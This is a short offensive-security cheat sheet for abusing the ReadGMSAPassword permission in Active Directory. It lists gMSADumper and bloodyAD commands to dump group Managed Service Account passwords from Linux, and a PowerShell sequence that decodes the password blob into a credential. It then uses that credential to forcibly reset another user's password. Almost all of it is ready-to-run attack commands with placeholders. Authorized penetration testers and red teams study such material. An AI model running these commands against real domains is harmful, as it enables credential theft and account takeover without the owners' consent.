---
title: "ReadGMSAPassword"
date: 2024-7-23
tags: ["ReadGMSAPassword", "gMSADumper", "active driectory", "ad", "Windows"]
---

---
### Abuse #1: Read GMSAPassword (From Linux)

#### gMSADumper

[gMSADumper](https://github.com/micahvandeusen/gMSADumper)

```bash
python3 gMSADumper.py -u <USER> -p <PASSWORD> -l <TARGET> -d <DOMAIN>
```

#### bloodAD

[bloodyAD](https://github.com/CravateRouge/bloodyAD)

```bash
python3 bloodyAD.py -d <DOMAIN> -u <USER> -p <PASSWORD> --host <DC> get object <TARGET_OBJECT> --attr msDS-ManagedPassword
```

### Abuse #2: Save as Cred (From Windows)

```powershell
$gmsa = Get-ADServiceAccount -Identity <TARGET_NAME> -Properties 'msDS-ManagedPassword'
```

```powershell
$mp = $gmsa.'msDS-ManagedPassword'
```

```powershell
$password = (ConvertFrom-ADManagedPasswordBlob $mp).CurrentPassword
```

```powershell
$SecPass = (ConvertFrom-ADManagedPasswordBlob $mp).SecureCurrentPassword
```

```powershell
$cred = New-Object System.Management.Automation.PSCredential <TARGET_NAME>, $SecPass
```

```powershell
# For example, change password of another target user
Invoke-Command -ComputerName <COMPUTER_NAME> -ScriptBlock {Set-ADAccountPassword -Identity <ANOTHER_TARGET_NAME> -reset -NewPassword (ConvertTo-SecureString -AsPlainText '<PASSWORD>' -force)} -Credential $cred
```

<br>